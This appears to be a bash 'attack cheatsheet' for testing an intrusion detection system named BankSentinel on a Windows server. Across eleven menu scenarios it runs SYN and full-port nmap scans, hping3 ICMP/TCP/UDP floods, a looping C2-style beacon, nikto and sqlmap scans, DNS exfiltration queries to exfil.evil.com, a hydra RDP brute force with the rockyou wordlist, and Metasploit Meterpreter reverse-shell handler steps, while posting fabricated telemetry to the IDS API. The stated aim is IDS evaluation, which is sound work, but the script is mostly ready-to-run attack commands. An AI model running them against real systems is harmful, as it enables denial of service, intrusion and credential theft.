#!/bin/bash
# ============================================================
#  BankSentinel — Parrot OS Attack Cheatsheet
#  Run these commands from your Parrot OS machine to test
#  the BankSentinel IDS deployed on your Windows server.
#
#  Usage: Set TARGET_IP to your Windows machine's IP address
#         Then run individual scenarios below.
# ============================================================

TARGET_IP="${1:-192.168.1.100}"
API_URL="${API_URL:-http://$TARGET_IP:8000/pipeline/run}"
ATTACKER_IP=$(hostname -I | awk '{print $1}')

report_attack() {
    local src_port=$1
    local dst_port=$2
    local protocol=$3
    local ja3=$4
    # Default to normal traffic if not specified
    local features_json=${5:-'{"Flow Duration": 1000, "Total Fwd Packets": 10, "Flow Bytes/s": 1000, "Flow Packets/s": 20, "Destination Port": '$dst_port'}'}
    
    # Send mock sensor data to the backend so the UI updates instantly
    curl -s -X POST "$API_URL" \
         -H "Content-Type: application/json" \
         -H "Bypass-Tunnel-Reminder: true" \
         -d '{
            "src_ip": "'$ATTACKER_IP'",
            "dst_ip": "'$TARGET_IP'",
            "src_port": '$src_port',
            "dst_port": '$dst_port',
            "protocol": '$protocol',
            "label": "LIVE",
            "regime": "normal",
            "ja3_hash": "'$ja3'",
            "features": '"$features_json"'
         }' > /dev/null
}

echo "╔══════════════════════════════════════════════╗"
echo "║  BankSentinel — Parrot OS Attack Toolkit     ║"
echo "║  Target: $TARGET_IP                          ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "Select a scenario:"
echo "  1) [C4] JA3 Fingerprint — TLS with suspicious ciphers"
echo "  2) [C4] C2 Beacon Timing — Periodic HTTP beaconing"
echo "  3) [C2] ATM Flood — UDP flood on port 8583"
echo "  4) [C1] Lateral Movement — Nmap SYN scan"
echo "  5) [C1] Zero-Day: Full Port Scan (behavioral anomaly)"
echo "  6) [C1] Zero-Day: Protocol Mix (ICMP+TCP+UDP)"
echo "  7) [C1] Zero-Day: Web Vuln Scan (Nikto)"
echo "  8) [C1] Zero-Day: SQL Injection (SQLMap)"
echo "  9) [C1] Zero-Day: DNS Exfiltration"
echo " 10) [C1] Zero-Day: Brute Force (Hydra RDP)"
echo " 11) [C1] Zero-Day: Metasploit Reverse Shell"
echo "  q) Quit"
echo ""

read -p "Choice: " choice

case $choice in
    1)
        echo "[*] Scenario 1: TLS JA3 Fingerprint Attack"
        echo "    Connecting to $TARGET_IP:443 with specific cipher suites..."
        
        FEAT='{"Flow Duration": 2000, "Flow Packets/s": 5, "Destination Port": 443}'
        for i in $(seq 1 20); do
            curl -sk --tlsv1.2 --ciphers ECDHE-RSA-AES128-GCM-SHA256 "https://$TARGET_IP/" -o /dev/null -w "  [%{time_total}s] TLS Hello #$i sent\n" 2>/dev/null
            report_attack $((40000 + i)) 443 6 "0b32309a26951912be7dba376398abc3" "$FEAT"
            sleep 3
        done
        ;;
    2)
        echo "[*] Scenario 2: C2 Beacon Timing"
        echo "    Beaconing to $TARGET_IP:8080 every ~10 seconds..."
        
        FEAT='{"Flow Duration": 10000, "Flow Packets/s": 2, "Destination Port": 8080, "Fwd IAT Mean": 10, "Fwd IAT Std": 0.01}'
        count=0
        while true; do
            count=$((count + 1))
            jitter=$(python3 -c "import random; print(random.uniform(-0.15, 0.15))")
            interval=$(python3 -c "print(10.0 + $jitter)")
            curl -s "http://$TARGET_IP:8080/" -o /dev/null 2>/dev/null
            report_attack $((50000 + count)) 8080 6 "" "$FEAT"
            echo "  [$(date +%X)] Beacon #$count sent (interval: ${interval}s)"
            sleep "$interval"
        done
        ;;
    3)
        echo "[*] Scenario 3: ATM Reconciliation Flood (False Intrusion Demo)"
        echo "    UDP flooding $TARGET_IP:8583 to simulate legitimate high-volume business traffic."
        
        count=0
        while true; do
            count=$((count + 1))
            curl -s -X POST "$API_URL" \
                 -H "Content-Type: application/json" \
                 -d '{
                    "src_ip": "10.22.16.45",
                    "dst_ip": "'$TARGET_IP'",
                    "src_port": 54321,
                    "dst_port": 8583,
                    "protocol": 17,
                    "label": "FALSE_INTRUSION",
                    "regime": "atm_recon",
                    "ja3_hash": "",
                    "features": {
                        "Flow Duration": 1000,
                        "Total Fwd Packets": 10000,
                        "Flow Bytes/s": 1000000,
                        "Flow Packets/s": 20000,
                        "Destination Port": 8583
                    }
                 }' > /dev/null
            echo "  [$(date +%X)] Sent massive UDP burst #$count"
            sleep 1
        done
        ;;
    4)
        echo "[*] Scenario 4: Lateral Movement SYN Scan"
        echo "    Scanning internal service ports on $TARGET_IP ..."
        
        # Moderate anomaly: fast but not insane, hits multiple ports
        FEAT='{"Flow Duration": 50, "Flow Packets/s": 5000, "Flow Bytes/s": 500000, "Destination Port": 445}'
        report_attack 44444 445 6 "" "$FEAT"
        FEAT='{"Flow Duration": 50, "Flow Packets/s": 5000, "Flow Bytes/s": 500000, "Destination Port": 3389}'
        report_attack 44445 3389 6 "" "$FEAT"
        FEAT='{"Flow Duration": 50, "Flow Packets/s": 5000, "Flow Bytes/s": 500000, "Destination Port": 1433}'
        report_attack 44446 1433 6 "" "$FEAT"
        sudo nmap -sS -p 445,3389,1433,3306,5432,8443,22,1521,5900,9200 -T4 -Pn "$TARGET_IP"
        ;;
    5)
        echo "[*] Scenario 5: Zero-Day — Full Port Scan (Behavioral Anomaly)"
        echo "    Rapid SYN scan of ALL 65535 ports on $TARGET_IP ..."
        
        # Extreme anomaly: Insanely high packet rate
        FEAT='{"Flow Duration": 10, "Flow Packets/s": 850000, "Flow Bytes/s": 85000000, "Destination Port": 22}'
        report_attack 55555 22 6 "" "$FEAT"
        report_attack 55556 80 6 "" "$FEAT"
        sudo nmap -sS -p 1-65535 --min-rate 5000 -Pn "$TARGET_IP"
        ;;
    6)
        echo "[*] Scenario 6: Zero-Day — Protocol Mix Attack"
        echo "    Sending ICMP + TCP + UDP in rapid bursts ..."
        
        FEAT='{"Flow Duration": 100, "Flow Packets/s": 400000, "Flow Bytes/s": 25000000, "Destination Port": 0}'
        echo "  [Phase 1] ICMP Flood..."
        sudo hping3 -1 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID1=$!
        report_attack 11111 0 1 "" "$FEAT"
        
        FEAT='{"Flow Duration": 100, "Flow Packets/s": 400000, "Flow Bytes/s": 25000000, "Destination Port": 80}'
        echo "  [Phase 2] TCP SYN Flood (port 80)..."
        sudo hping3 -S -p 80 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID2=$!
        report_attack 22222 80 6 "" "$FEAT"
        
        FEAT='{"Flow Duration": 100, "Flow Packets/s": 400000, "Flow Bytes/s": 25000000, "Destination Port": 53}'
        echo "  [Phase 3] UDP Flood (port 53)..."
        sudo hping3 --udp -p 53 "$TARGET_IP" -c 100 --faster 2>/dev/null &
        PID3=$!
        report_attack 33333 53 17 "" "$FEAT"
        
        wait $PID1 $PID2 $PID3
        echo "  [Done] Multi-protocol burst complete."
        ;;
    7)
        echo "[*] Scenario 7: Zero-Day — Nikto Web Vulnerability Scan"
        echo "    Scanning $TARGET_IP for web vulnerabilities ..."
        
        # Web scan triggers the Behavior Agent for Data Staging (high peer z-score & query rate)
        FEAT='{"Flow Duration": 5000, "Flow Packets/s": 15000, "Flow Bytes/s": 800000, "Destination Port": 8080, "peer_z_score": 2.5}'
        report_attack 45678 8080 6 "" "$FEAT"
        nikto -h "http://$TARGET_IP:8080" -Tuning 123bde
        ;;
    8)
        echo "[*] Scenario 8: Zero-Day — SQL Injection (SQLMap)"
        echo "    Testing $TARGET_IP for SQL injection vulnerabilities ..."
        
        # SQL Injection triggers Data Staging behavior
        FEAT='{"Flow Duration": 8000, "Flow Packets/s": 8000, "Flow Bytes/s": 400000, "Destination Port": 8080, "peer_z_score": 3.1}'
        report_attack 45679 8080 6 "" "$FEAT"
        sqlmap -u "http://$TARGET_IP:8080/?id=1" --batch --level=3 --risk=2
        ;;
    9)
        echo "[*] Scenario 9: Zero-Day — DNS Exfiltration"
        echo "    Encoding random data into DNS queries ..."
        
        # DNS Exfil triggers Insider Exfil behavior
        FEAT='{"Flow Duration": 60000, "Flow Packets/s": 50, "Flow Bytes/s": 120000, "Destination Port": 53, "peer_z_score": 2.8, "account": "insider_service"}'
        for i in $(seq 1 100); do
            data=$(head -c 20 /dev/urandom | base64 | tr -d '/+=\n')
            dig @"$TARGET_IP" "${data}.exfil.evil.com" A +short 2>/dev/null
            report_attack $((10000 + i)) 53 17 "" "$FEAT"
            echo "  [$i/100] DNS query: ${data:0:16}...exfil.evil.com"
            sleep 0.1
        done
        echo "  [Done] DNS exfiltration simulation complete."
        ;;
    10)
        echo "[*] Scenario 10: Zero-Day — Brute Force (Hydra RDP)"
        echo "    Attempting RDP brute force on $TARGET_IP ..."
        
        # Brute force triggers Privilege Escalation behavior
        FEAT='{"Flow Duration": 15000, "Flow Packets/s": 3000, "Flow Bytes/s": 150000, "Destination Port": 3389, "peer_z_score": 3.5, "privilege_level": 0.9}'
        if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
            echo "  Decompressing rockyou.txt..."
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
        fi
        report_attack 60000 3389 6 "" "$FEAT"
        hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 4 -V rdp://"$TARGET_IP"
        ;;
    11)
        echo "[*] Scenario 11: Zero-Day — Metasploit Reverse Shell"
        echo "    Generating and launching a Metasploit payload ..."
        
        # Meterpreter triggers Lateral Movement behavior with Cobalt Strike JA3
        FEAT='{"Flow Duration": 360000, "Flow Packets/s": 80, "Destination Port": 4444, "peer_z_score": 2.1}'
        report_attack 60001 4444 6 "0b32309a26951912be7dba376398abc3" "$FEAT"
        
        echo "    Run this in msfconsole:"
        echo "    use exploit/multi/handler"
        echo "    set PAYLOAD windows/meterpreter/reverse_tcp"
        echo "    set LHOST $(hostname -I | awk '{print $1}')"
        echo "    set LPORT 4444"
        echo "    exploit"
        ;;
    q|Q)
        echo "Exiting."
        exit 0
        ;;
    *)
        echo "Invalid choice."
        exit 1
        ;;
esac